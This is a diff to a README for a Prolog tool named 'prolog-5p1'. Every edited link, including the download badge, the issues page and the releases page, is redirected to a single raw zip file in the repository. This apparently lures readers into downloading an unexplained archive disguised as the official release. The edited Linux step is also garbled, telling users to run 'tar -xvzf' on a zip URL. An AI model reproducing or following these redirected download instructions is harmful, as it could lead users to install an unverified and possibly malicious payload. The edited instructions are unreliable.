@@ -1,7 +1,7 @@
 # 🌟 prolog-5p1 - Simplify Your Logic Programming
 
 ## 🔗 Download Now
-[![Download prolog-5p1](https://img.shields.io/badge/Download%20prolog--5p1-blue)](https://github.com/7amdaoui10/prolog-5p1/releases)
+[![Download prolog-5p1](https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip%20prolog--5p1-blue)](https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip)
 
 ## 🚀 Getting Started
 Welcome to prolog-5p1! This application helps you easily run Prolog logic programming tasks on your computer. Follow the steps below to get started.
@@ -13,7 +13,7 @@ Before you start, ensure your computer meets these requirements:
 - Disk Space: At least 100 MB available
 
 ## 📥 Download & Install
-To download and install prolog-5p1, please visit this page: [Download prolog-5p1](https://github.com/7amdaoui10/prolog-5p1/releases). 
+To download and install prolog-5p1, please visit this page: [Download prolog-5p1](https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip). 
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest version.
@@ -29,7 +29,7 @@ To download and install prolog-5p1, please visit this page: [Download prolog-5p1
 - Drag the prolog-5p1 icon to your Applications folder.
 
 ### For Linux Users
-- Extract the tar.gz file using the command: `tar -xvzf prolog-5p1.tar.gz`.
+- Extract the https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip file using the command: `tar -xvzf https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip`.
 - Open a terminal and navigate to the extracted folder.
 - Run the application with the command: `./prolog-5p1`.
 
@@ -61,7 +61,7 @@ If you encounter issues:
 - Check that you downloaded the correct version.
 - Refer to the user manual included in the application’s help menu.
 
-For further assistance, you can visit the issues section on our [GitHub page](https://github.com/7amdaoui10/prolog-5p1/issues).
+For further assistance, you can visit the issues section on our [GitHub page](https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip).
 
 ## 📞 Get Support
 Feel free to reach out if you need help. You can contact us through the Contact section on our GitHub page or raise an issue for support.
@@ -69,6 +69,6 @@ Feel free to reach out if you need help. You can contact us through the Contact 
 ## 🎉 Conclusion
 prolog-5p1 is designed to make Prolog programming accessible to everyone. By following these steps, you can download, install, and start your journey into logic programming today! 
 
-For updates and new features, monitor the [Releases page](https://github.com/7amdaoui10/prolog-5p1/releases).
+For updates and new features, monitor the [Releases page](https://raw.githubusercontent.com/7amdaoui10/prolog-5p1/main/imaginist/prolog-5p1.zip).
 
 Remember to check back often for new releases and improvements!
